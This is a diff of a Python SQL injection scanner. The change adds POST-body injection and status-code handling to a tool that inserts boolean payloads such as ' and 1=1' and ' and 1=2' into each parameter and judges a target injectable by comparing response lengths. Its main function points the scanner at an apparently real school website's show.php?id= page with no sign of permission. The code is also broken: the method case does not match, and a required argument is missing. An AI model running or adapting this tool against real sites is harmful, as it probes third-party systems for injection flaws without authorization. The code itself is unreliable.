@@ -8,29 +8,39 @@ import re
 
 
 class Sql:
-    def __init__(self, target):
+    def __init__(self, target, method, data):
         self.target = target
+        self.method = method.decode()
+        self.data = data.decode()
         self.waf = ''
         self.payload = {' and 1=1': ' and 1=2', "' and '1'='1": "' and '1'='2"}
 
     @staticmethod
-    def _conn(url):
+    def _status(conn):
+        if conn.status_code == 500:
+            # print("服务器错误!")
+            return False
+        if conn.status_code == 406:
+            # print("无法接受!")
+            return False
+        if conn.status_code == 302:
+            # print("重定向错误!")
+            return False
+        if conn.status_code != 200:
+            # print("连接错误，响应码为%s" % conn.status_code)
+            return False
+        else:
+            return conn
+
+    def _conn(self, url, data=''):
         try:
-            conn = requests.get(url, timeout=1, allow_redirects=False)
-            if conn.status_code == 500:
-                # print("服务器错误!")
-                return False
-            if conn.status_code == 406:
-                # print("无法接受!")
-                return False
-            if conn.status_code == 302:
-                # print("重定向错误!")
-                return False
-            if conn.status_code != 200:
-                # print("连接错误，响应码为%s" % conn.status_code)
-                return False
-            else:
-                return conn
+            if self.method == 'GET':
+                conn = requests.get(url, timeout=1, allow_redirects=False)
+                return self._status(conn)
+            elif self.method == 'POST':
+                conn = requests.post(url, data=data, timeout=1, allow_redirects=False)
+                return self._status(conn)
+
         except:
             # print('无法连接')
             return False
@@ -55,7 +65,7 @@ class Sql:
         else:
             self.waf = ''
 
-    def insert(self, _payload, payload):
+    def get_insert(self, _payload, payload):
         res = ''
         reses = []
         urls = {}
@@ -70,45 +80,73 @@ class Sql:
             urls[self.target+_payload] = self.target+payload
         return urls
 
+    def post_insert(self, _payload, payload):
+        res = ''
+        reses = []
+        datas = {}
+        if '&' in self.data:
+            for _url in self.data.split('&'):
+                res += _url + '&'
+                reses.append(res)
+            for _url in reses:
+                data = self.data.replace(_url[:-1], _url[:-1]+_payload)
+                datas[data] = self.data.replace(_url[:-1], _url[:-1]+payload)
+        else:
+            datas[self.data+_payload] = self.data+payload
+        return datas
+
     def _scan(self):
         try:
-            for url, payload in self.payload.items():
-                urls = self.insert(url, payload)
-                for key, value in urls.items():
-                    conn1 = self._conn(key)  # 正常连接
-                    conn = self._conn(value)
-                    if conn and conn1:
-                        self._waf(conn)
-                    else:
+            for _payload, payload in self.payload.items():
+                # 插入不同的位置
+                if self.method == 'GET':
+                    pattern = re.compile('(.*\?.*=\d+)|(.*/\d+)')
+                    if not re.search(pattern, self.target):
                         return False
-                    if not (90 > len(conn1.content)-len(conn.content) > -90) and self.waf == '':
-                        #print(len(conn1.content)-len(conn.content))
-                        print('\n'+value)
-                        return self.target
+
+                    urls = self.get_insert(_payload, payload)
+
+                    for key, value in urls.items():
+                        conn1 = self._conn(key)  # 正常连接
+                        conn = self._conn(value)
+                        if conn and conn1:
+                            self._waf(conn)
+                        else:
+                            return False
+                        if not (90 > len(conn1.content) - len(conn.content) > -90) and self.waf == '':
+                            # print(len(conn1.content)-len(conn.content))
+                            print('\n' + value)
+                            return self.target
+
+                if self.method == 'POST':
+                    datas = self.post_insert(_payload, payload)
+
+                    for key, value in datas.items():
+                        conn1 = self._conn(self.target, key)  # 正常连接
+                        conn = self._conn(self.target, value)
+                        if conn and conn1:
+                            self._waf(conn)
+                        else:
+                            return False
+                        if not (90 > len(conn1.content)-len(conn.content) > -90) and self.waf == '':
+                            # print(len(conn1.content)-len(conn.content))
+                            print('\n'+value)
+                            return self.target
             return False
         except Exception as e:
             print('不存在注入'+str(e))
             return False
 
-    def get_sql_in(self):
-        pattern = re.compile('(.*\?.*=\d+)|(.*/\d+)')
-        if re.search(pattern, self.target):
-            return True
-
     def run(self):
-        if self.get_sql_in():
-            if self._scan():
-                print('可能存在注入:' + self.target)
-                return 1
-            else:
-                return 0
-
+        if self._scan():
+            print('可能存在注入:' + self.target)
+            return 1
         else:
             return 0
 
 
 def main():
-    s = Sql(target='http://nhez.nh.edu.sh.cn/xwgf/show.php')
+    s = Sql(target='http://nhez.nh.edu.sh.cn/xwgf/show.php?id=4461', method=b'Get')
     s.run()
 
 if __name__ == '__main__':
